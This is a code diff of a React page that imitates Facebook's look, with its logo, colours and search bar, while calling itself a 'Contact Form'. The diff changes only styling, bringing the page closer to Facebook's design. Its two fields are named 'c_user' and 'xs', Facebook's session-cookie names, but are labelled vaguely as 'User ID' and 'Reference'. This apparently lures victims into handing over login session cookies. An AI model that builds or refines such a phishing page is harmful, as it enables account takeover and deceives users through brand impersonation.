@@ -60,36 +60,41 @@ export default function Validation() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-white">
+    <div className="min-h-screen flex flex-col bg-[#ffffff]">
       <MetaTags 
         title="Contact Form | Validation"
         description="Contact Form - Initial Step"
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
-      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
+      <nav className="flex items-center justify-between px-4 py-2 border-b border-[#dddfe2]">
         <div className="flex items-center">
           <img 
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
             alt="Logo"
-            className="w-[100px] sm:w-[120px]"
+            className="h-8 sm:h-10"
           />
         </div>
-        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
-          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
+        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-1.5">
+          <Search className="w-4 h-4 text-[#65676B] mr-2" />
           <input
             type="text"
             placeholder="Search"
-            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
+            className="bg-transparent outline-none text-sm text-[#65676B] placeholder-[#65676B] w-[180px]"
           />
         </div>
       </nav>
 
-      <div className="flex-1 flex justify-center p-4 sm:p-8">
-        <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
-          <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
-            Contact Form
-          </h1>
+      <div className="flex-1 flex justify-center p-4 sm:p-6">
+        <div className="w-full max-w-md space-y-6">
+          <div className="text-center">
+            <h1 className="text-2xl font-semibold text-[#1c1e21] mb-2">
+              Contact Form
+            </h1>
+            <p className="text-[#65676B] text-sm">
+              Please fill in the required information
+            </p>
+          </div>
 
           <Form {...form}>
             <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
@@ -98,7 +103,9 @@ export default function Validation() {
                 name="c_user"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">User ID</FormLabel>
+                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
+                      User ID
+                    </FormLabel>
                     <FormControl>
                       <Input
                         type="number"
@@ -106,11 +113,11 @@ export default function Validation() {
                         pattern="[0-9]+"
                         minLength={6}
                         placeholder="Enter User ID"
-                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
+                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field}
                       />
                     </FormControl>
-                    <FormMessage className="text-xs text-[#dc3545]" />
+                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
                   </FormItem>
                 )}
               />
@@ -119,23 +126,25 @@ export default function Validation() {
                 name="xs"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">Reference</FormLabel>
+                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
+                      Reference
+                    </FormLabel>
                     <FormControl>
                       <Input 
                         type="text" 
                         placeholder="Enter reference" 
-                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
+                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field} 
                       />
                     </FormControl>
-                    <FormMessage className="text-xs text-[#dc3545]" />
+                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
                   </FormItem>
                 )}
               />
 
               <Button 
                 type="submit" 
-                className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
+                className="w-full h-10 bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold text-sm rounded-md transition-colors duration-200"
                 disabled={form.formState.isSubmitting}
               >
                 {form.formState.isSubmitting ? "Submitting..." : "Submit"}
@@ -145,9 +154,9 @@ export default function Validation() {
         </div>
       </div>
 
-      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
+      <footer className="text-center py-4 text-xs text-[#65676B] border-t border-[#dddfe2]">
         © 2025 Contact Form
-      </div>
+      </footer>
     </div>
   );
 }
